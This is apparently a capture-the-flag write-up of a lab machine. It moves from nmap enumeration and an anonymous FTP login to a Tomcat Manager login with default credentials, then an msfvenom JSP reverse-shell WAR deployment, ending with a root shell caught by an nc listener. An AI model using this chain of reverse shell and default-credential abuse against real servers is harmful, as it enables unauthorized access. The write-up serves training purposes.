

# -Pn

## Reconnaissance and Enumeration
Check that the machine is up and running.

```bash
❯ ping -c 1 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.036 ms

--- 172.17.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.036/0.036/0.036/0.000 ms

```

Once we get a response from ping, we can start enumerating the machine. The ttl=64 might indicate that it is a Linux machine.

We run nmap to see which ports are open.

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn -oG allPorts 172.17.0.2
```
- `-sS`: Performs a SYN scan.
- `-p-`: Scans all ports.
- `--open`: Shows only open ports.
- `--min-rate 5000`: Sets the minimum packet sending rate to 5000 per second.
- `-vvv`: Generates very detailed and verbose output.
- `-n`: Prevents reverse DNS resolution.
- `-Pn`: Skips host discovery.
- `-oG allPorts`: Saves the results in a file called "allPorts".
- `172.17.0.2`: The target host IP address.

```bash
PORT     STATE SERVICE    REASON
21/tcp   open  ftp        syn-ack ttl 64
8080/tcp open  http-proxy syn-ack ttl 64
```

Since we have ports 21 and 8080 open, let's check the version and run some basic scripts to see what information we can gather.

```bash
nmap -sCV -p21,8080 -vvv -oN versionPorts 172.17.0.2
```
- `-sCV`: Version and vulnerability scan.
- `-p21,8080`: Scans ports 21 (FTP) and 8080 (HTTP).
- `-vvv`: Very detailed and verbose output.
- `-oN versionPorts`: Saves the results in "versionPorts".
- `172.17.0.2`: The IP address of the scanned host.
```bash
PORT     STATE SERVICE REASON         VERSION
21/tcp   open  ftp     syn-ack ttl 64 vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0              74 Apr 19 07:32 tomcat.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:172.17.0.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
8080/tcp open  http    syn-ack ttl 64 Apache Tomcat 9.0.88
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/9.0.88
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
```
We can see that we have the Anonymous user in the open FTP, so let's connect.
```bash
ftp 172.17.0.2
```
```
❯ ftp 172.17.0.2
Connected to 172.17.0.2.
220 (vsFTPd 3.0.5)
Name (172.17.0.2:tbrux): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||15473|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0              74 Apr 19 07:32 tomcat.txt
```
We find a file called tomcat.txt, so we download it to our machine and check what information it contains.
```bash
get tomcat.txt
```
```
tp> get tomcat.txt
local: tomcat.txt remote: tomcat.txt
229 Entering Extended Passive Mode (|||38522|)
150 Opening BINARY mode data connection for tomcat.txt (74 bytes).
100% |***********************************************************************************************************************************************************************************************|    74        1.10 MiB/s    00:00 ETA
226 Transfer complete.
74 bytes received in 00:00 (227.25 KiB/s)
ftp> exit
221 Goodbye.
❯ cat tomcat.txt
Hello tomcat, can you configure the tomcat server? I lost the password...
```
It’s a message for the tomcat user, so now we just need to find the password. Let's check port 8080.

## Exploitation.
Click on the Manager APP button. We try one of the default passwords for the tomcat user and we are inside the panel.
```
tomcat:s3cr3t
```
On the page, we see the options and go to WAR file to deploy. From there, we can upload a malicious file with a reverse shell created using msfvenom.
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.17.0.1 LPORT=443 -f war -o revshell.war
```
Once created, we see a list of files and directories. We start listening on port 443.
```bash
nc -lvnp 443
```
We click on the revshell file we uploaded and establish a reverse shell with the victim machine with root privileges.
```
❯ nc -lvnp 443
listening on [any] 443 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 59678
whoami
root
```
